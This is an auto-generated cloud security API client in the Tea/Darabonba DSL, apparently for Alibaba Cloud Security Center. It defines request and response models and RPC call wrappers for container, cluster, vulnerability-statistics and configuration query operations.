model DescribeCloudProductFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudProductFieldStatisticsResponseBody(name='body'),
}

async function describeCloudProductFieldStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeCloudProductFieldStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCloudProductFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCloudProductFieldStatistics(): DescribeCloudProductFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudProductFieldStatisticsWithOptions(runtime);
}

model DescribeClusterBasicInfoRequest {
  clusterId?: string(name='ClusterId', example='c870ec78ecbcb41d2a35c679823ef****'),
  targetType?: string(name='TargetType', example='Cluster'),
  type?: string(name='Type', example='containerNetwork'),
}

model DescribeClusterBasicInfoResponseBody = {
  clusterInfo?: {
    clusterId?: string(name='ClusterId', example='c870ec78ecbcb41d2a35c679823ef****'),
    clusterName?: string(name='ClusterName', example='testackpro'),
    clusterType?: string(name='ClusterType', example='kubernetes'),
    createTime?: long(name='CreateTime', example='1662038134000'),
    currentVersion?: string(name='CurrentVersion', example='1.22.10-aliyun.1'),
    instanceCount?: int32(name='InstanceCount', example='10'),
    regionId?: string(name='RegionId', example='cn-hangzhou'),
    state?: string(name='State', example='Available'),
    targetResult?: boolean(name='TargetResult', example='true'),
  }(name='ClusterInfo'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeClusterBasicInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterBasicInfoResponseBody(name='body'),
}

async function describeClusterBasicInfoWithOptions(request: DescribeClusterBasicInfoRequest, runtime: Util.RuntimeOptions): DescribeClusterBasicInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterBasicInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterBasicInfo(request: DescribeClusterBasicInfoRequest): DescribeClusterBasicInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterBasicInfoWithOptions(request, runtime);
}

model DescribeClusterInfoListRequest {
  target?: string(name='Target', example='c23551de6149343e8a54e69fbefe6****'),
  targetType?: string(name='TargetType', example='Cluster'),
  type?: string(name='Type', example='containerNetwork'),
}

model DescribeClusterInfoListResponseBody = {
  clusterList?: [ 
    {
      clusterId?: string(name='ClusterId', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      clusterName?: string(name='ClusterName', example='test111'),
      clusterType?: string(name='ClusterType', example='ManagedKubernetes'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      state?: string(name='State', example='Available'),
      targetResult?: boolean(name='TargetResult', example='true'),
    }
  ](name='ClusterList'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeClusterInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterInfoListResponseBody(name='body'),
}

async function describeClusterInfoListWithOptions(request: DescribeClusterInfoListRequest, runtime: Util.RuntimeOptions): DescribeClusterInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterInfoList(request: DescribeClusterInfoListRequest): DescribeClusterInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterInfoListWithOptions(request, runtime);
}

model DescribeClusterNetworkRequest {
  endTime?: long(name='EndTime', description='The end timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1656038940435'),
  startTime?: long(name='StartTime', description='The start timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1656038740435'),
}

model DescribeClusterNetworkResponseBody = {
  clusterNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', description='The ID of the destination node.', example='cfb41a869c71e4678a97021582dd8****'),
        dstNodeType?: string(name='DstNodeType', description='The type of the destination node. Valid values:

*   **cluster**: a cluster', example='cluster'),
        id?: string(name='Id', description='The ID of the topology edge.', example='1'),
        port?: string(name='Port', description='The port number of the topology edge.', example='6164'),
        srcNodeId?: string(name='SrcNodeId', description='The ID of the source node.', example='cfb41a869c71e4678a97021582dd8****'),
        srcNodeType?: string(name='SrcNodeType', description='The type of the source node. Valid values:

*   **cluster**: a cluster
*   **internet**: a network node in another cluster', example='cluster'),
      }
    ](name='Edge', description='An array that consists of information about the topology edge.'),
    node?: [ 
      {
        cnnfSwitch?: int32(name='CnnfSwitch', description='The micro-segmentation switch. Valid values:

*   **0**: The switch is turned off.
*   **1**: The switch is turned on.', example='1'),
        id?: string(name='Id', description='The ID of the node.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
        interceptionType?: int32(name='InterceptionType', description='The network type. Valid values:

*   **0**: classic network
*   **1**: virtual private cloud (VPC)', example='1'),
        name?: string(name='Name', description='The name of the node.', example='testwww'),
        netTopoSwitch?: string(name='NetTopoSwitch', description='The network topology switch. Valid values:

*   **ON**
*   **OFF**', example='ON'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **3**: high
*   **2**: medium
*   **1**: low
*   **0**: warning
*   **-1**: unknown', example='3'),
        type?: string(name='Type', description='The type of the node. Valid values:

*   **cluster**: a cluster
*   **internet**: a node in another cluster', example='cluster'),
      }
    ](name='Node', description='An array that consists of information about the node.'),
  }(name='ClusterNetwork', description='Information about the network topology edge in the cluster.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model DescribeClusterNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterNetworkResponseBody(name='body'),
}

async function describeClusterNetworkWithOptions(request: DescribeClusterNetworkRequest, runtime: Util.RuntimeOptions): DescribeClusterNetworkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterNetwork(request: DescribeClusterNetworkRequest): DescribeClusterNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterNetworkWithOptions(request, runtime);
}

model DescribeClusterVulStatisticsRequest {
  clusterId?: string(name='ClusterId', example='c471f0f61b9c04f8380556e922cf1****'),
  types?: string(name='Types', example='cve,app,sca'),
}

model DescribeClusterVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  vulStat?: {
    asapCount?: string(name='AsapCount', example='13'),
    laterCount?: string(name='LaterCount', example='21'),
    nntfCount?: string(name='NntfCount', example='0'),
  }(name='VulStat'),
}

model DescribeClusterVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterVulStatisticsResponseBody(name='body'),
}

async function describeClusterVulStatisticsWithOptions(request: DescribeClusterVulStatisticsRequest, runtime: Util.RuntimeOptions): DescribeClusterVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterVulStatistics(request: DescribeClusterVulStatisticsRequest): DescribeClusterVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterVulStatisticsWithOptions(request, runtime);
}

model DescribeCommonOverallConfigRequest {
  sourceIp?: string(name='SourceIp', example='59.61.XX.XX'),
  type?: string(name='Type', example='kdump_switch'),
}

model DescribeCommonOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', example='on'),
    type?: string(name='Type', example='kdump_switch'),
  }(name='OverallConfig'),
  requestId?: string(name='RequestId', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigResponseBody(name='body'),
}

async function describeCommonOverallConfigWithOptions(request: DescribeCommonOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonOverallConfig(request: DescribeCommonOverallConfigRequest): DescribeCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigWithOptions(request, runtime);
}

model DescribeCommonOverallConfigListRequest {
  sourceIp?: string(name='SourceIp', example='119.136.XX.XX'),
  typeList?: [ string ](name='TypeList'),
}

model DescribeCommonOverallConfigListResponseBody = {
  overallList?: [ 
    {
      config?: string(name='Config', example='on'),
      totalCount?: int32(name='TotalCount', example='184'),
      type?: string(name='Type', example='kdump_switch'),
    }
  ](name='OverallList'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeCommonOverallConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigListResponseBody(name='body'),
}

async function describeCommonOverallConfigListWithOptions(request: DescribeCommonOverallConfigListRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonOverallConfigList(request: DescribeCommonOverallConfigListRequest): DescribeCommonOverallConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigListWithOptions(request, runtime);
}

model DescribeCommonTargetConfigRequest {
  type?: string(name='Type', example='kdump_switch'),
}

model DescribeCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  targetList?: [ 
    {
      flag?: string(name='Flag', example='add'),
      target?: string(name='Target', example='c23551de6149343e8a54e69fbefe6****'),
      targetType?: string(name='TargetType', example='image_repo'),
    }
  ](name='TargetList'),
}

model DescribeCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetConfigResponseBody(name='body'),
}

async function describeCommonTargetConfigWithOptions(request: DescribeCommonTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonTargetConfig(request: DescribeCommonTargetConfigRequest): DescribeCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetConfigWithOptions(request, runtime);
}

model DescribeCommonTargetResultListRequest {
  sourceIp?: string(name='SourceIp', example='113.57.XX.XX'),
  type?: string(name='Type', example='webshell_timescan'),
}

model DescribeCommonTargetResultListResponseBody = {
  requestId?: string(name='RequestId', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  targetConfig?: {
    flag?: string(name='Flag', example='del'),
    targetDefault?: string(name='TargetDefault', example='add'),
    targetList?: [ string ](name='TargetList'),
    targetType?: string(name='TargetType', example='uuid'),
    totalCount?: string(name='TotalCount', example='22'),
    type?: string(name='Type', example='webshell_timescan'),
  }(name='TargetConfig'),
}

model DescribeCommonTargetResultListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetResultListResponseBody(name='body'),
}

async function describeCommonTargetResultListWithOptions(request: DescribeCommonTargetResultListRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetResultListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetResultList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonTargetResultList(request: DescribeCommonTargetResultListRequest): DescribeCommonTargetResultListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetResultListWithOptions(request, runtime);
}

model DescribeConcernNecessityRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeConcernNecessityResponseBody = {
  concernNecessity?: [ string ](name='ConcernNecessity'),
  requestId?: string(name='RequestId', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeConcernNecessityResponseBody(name='body'),
}

async function describeConcernNecessityWithOptions(request: DescribeConcernNecessityRequest, runtime: Util.RuntimeOptions): DescribeConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeConcernNecessity(request: DescribeConcernNecessityRequest): DescribeConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeConcernNecessityWithOptions(request, runtime);
}

model DescribeContainerCriteriaRequest {
  groupField?: string(name='GroupField', example='clusterId'),
  value?: string(name='Value', example='cfb41a869c71e4678a97021582dd8a****'),
}

model DescribeContainerCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='clusterId'),
      type?: string(name='Type', example='input'),
      values?: string(name='Values', example='ManagedKubernetes,NotManagedKubernetes,PrivateKubernetes'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeContainerCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerCriteriaResponseBody(name='body'),
}

async function describeContainerCriteriaWithOptions(request: DescribeContainerCriteriaRequest, runtime: Util.RuntimeOptions): DescribeContainerCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerCriteria(request: DescribeContainerCriteriaRequest): DescribeContainerCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerCriteriaWithOptions(request, runtime);
}

model DescribeContainerInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to filter containers. The value of this parameter is in the JSON format and is case-sensitive. The value contains the following fields:

*   **name**: the search condition.

*   **name**: the value of the search condition.

*   **logicalExp**: the logical relationship among multiple search conditions. Valid values:

    *   **OR**: Search conditions are evaluated by using a logical **OR**.
    *   **AND**: Search conditions are evaluated by using a logical **AND**.

> You can use search conditions such as the container ID, cluster ID, cluster name, cluster type, risk level, and region. You can call the [DescribeContainerCriteria](~~DescribeContainerCriteria~~) operation to query the supported search conditions.', example='[{"name":"flag","value":"0|8","logicalExp":"AND"},{"name":"ecsType","value":"!8","logicalExp":"AND"}][{"name":"clusterType","value":"NotManagedKubernetes","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical operator that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='AND'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeContainerInstancesResponseBody = {
  containerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts.', example='1'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the container. Valid values:

*   **YES**
*   **NO**', example='YES'),
      appName?: string(name='AppName', description='The name of the application.', example='alibaba-log-controller'),
      clusterId?: string(name='ClusterId', description='The ID of cluster.', example='cfb41a869c71e4678a97021582dd8a****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d****'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1670368337000'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks.', example='1'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks are detected. Valid values:

*   **NO**
*   **YES**', example='YES'),
      hostIp?: string(name='HostIp', description='The IP address of the server.', example='172.24.XX.XX'),
      image?: string(name='Image', description='The image of the container.', example='docker.io/library/nginx:latest'),
      imageDigest?: string(name='ImageDigest', description='The digest value of the image.', example='5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/log-controller@sha256:5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='log-controller'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace to which the image repository belongs.', example='acs'),
      imageRepoTag?: string(name='ImageRepoTag', description='The tag that is added to the image.', example='0.3.1.0-dfa2010-aliyun'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='5f23dfbceec289a49ac94e035e2****'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-2zegzjyotydfkz9****'),
      namespace?: string(name='Namespace', description='The namespace.', example='kube-system'),
      nodeInfo?: string(name='NodeInfo', description='The node information.', example='test'),
      nodeName?: string(name='NodeName', description='The name of the node.', example='test'),
      pod?: string(name='Pod', description='The pod.', example='alibaba-log-controller-6f847f8786-mk2mg'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.24.XX.XX'),
      regionId?: string(name='RegionId', description='The region ID of the container.', example='cn-hangzhou'),
      riskCount?: string(name='RiskCount', description='The number of risks.', example='1'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks exist. Valid values:

*   **NO**
*   **YES**', example='YES'),
      updateMark?: string(name='UpdateMark', description='The update identifier of the container.', example='79cff74d-e967-5407-8a78-ee03b9****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected in the container cluster.', example='15'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected in the container. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='ContainerInstanceList', description='An array that consists of the information about containers.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerInstancesResponseBody(name='body'),
}

async function describeContainerInstancesWithOptions(request: DescribeContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerInstances(request: DescribeContainerInstancesRequest): DescribeContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerInstancesWithOptions(request, runtime);
}

model DescribeContainerStatisticsRequest {
  clusterId?: string(name='ClusterId', description='DescribeContainerStatistics', example='Cccfd68c474454665ace07efce924****'),
}

model DescribeContainerStatisticsResponseBody = {
  data?: {
    remindAlarmCount?: int32(name='RemindAlarmCount', example='1'),
    seriousAlarmCount?: int32(name='SeriousAlarmCount', example='2'),
    suspiciousAlarmCount?: int32(name='SuspiciousAlarmCount', example='3'),
    totalAlarmCount?: int32(name='TotalAlarmCount', example='6'),
    totalNode?: int32(name='TotalNode', example='12'),
    hasRiskNode?: int32(name='hasRiskNode', example='4'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='21DA46CA-2DCE-4FF6-907D-D5DBBB7518C8'),
}

model DescribeContainerStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerStatisticsResponseBody(name='body'),
}

/**
  * The number of nodes on which alerts are generated in the current container cluster.
  *
  * @param request DescribeContainerStatisticsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeContainerStatisticsResponse
 */
async function describeContainerStatisticsWithOptions(request: DescribeContainerStatisticsRequest, runtime: Util.RuntimeOptions): DescribeContainerStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The number of nodes on which alerts are generated in the current container cluster.
  *
  * @param request DescribeContainerStatisticsRequest
  * @return DescribeContainerStatisticsResponse
 */
async function describeContainerStatistics(request: DescribeContainerStatisticsRequest): DescribeContainerStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerStatisticsWithOptions(request, runtime);
}

model DescribeContainerTagsRequest {
  appName?: string(name='AppName', example='node-exporter'),
  clusterId?: string(name='ClusterId', example='c22143730ab6e40b09ec7c1c51d4d****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  fieldName?: string(name='FieldName', example='namespace'),
  fieldValue?: string(name='FieldValue', example='demo4'),
  namespace?: string(name='Namespace', example='test-name-01'),
  pageSize?: int32(name='PageSize', example='200'),
}

model DescribeContainerTagsResponseBody = {
  requestId?: string(name='RequestId', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  tagValues?: [ string ](name='TagValues'),
}

model DescribeContainerTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerTagsResponseBody(name='body'),
}

async function describeContainerTagsWithOptions(request: DescribeContainerTagsRequest, runtime: Util.RuntimeOptions): DescribeContainerTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerTags(request: DescribeContainerTagsRequest): DescribeContainerTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerTagsWithOptions(request, runtime);
}

model DescribeCountNotScannedImageResponseBody = {
  notScannedCnt?: int32(name='NotScannedCnt', example='28'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeCountNotScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountNotScannedImageResponseBody(name='body'),
}

async function describeCountNotScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountNotScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountNotScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCountNotScannedImage(): DescribeCountNotScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountNotScannedImageWithOptions(runtime);
}

model DescribeCountScannedImageResponseBody = {
  requestId?: string(name='RequestId', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
  scannedCount?: int32(name='ScannedCount', example='11'),
}

